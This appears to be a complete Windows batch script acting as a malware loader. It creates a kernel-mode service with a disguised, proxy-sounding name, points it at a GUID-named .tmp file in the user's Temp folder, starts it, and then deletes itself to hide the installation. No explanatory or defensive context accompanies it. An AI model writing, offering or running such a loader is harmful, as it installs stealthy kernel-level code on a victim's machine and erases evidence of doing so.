@echo off
cd %~dp0
sc create AutoHttpWinProxySvc6374_c binpath=C:\Users\%username%\AppData\Local\Temp\39de3374-aa2c-4a91-97ae-b356c3d94216.tmp type=kernel
sc start AutoHttpWinProxySvc6374_c
del "%~f0"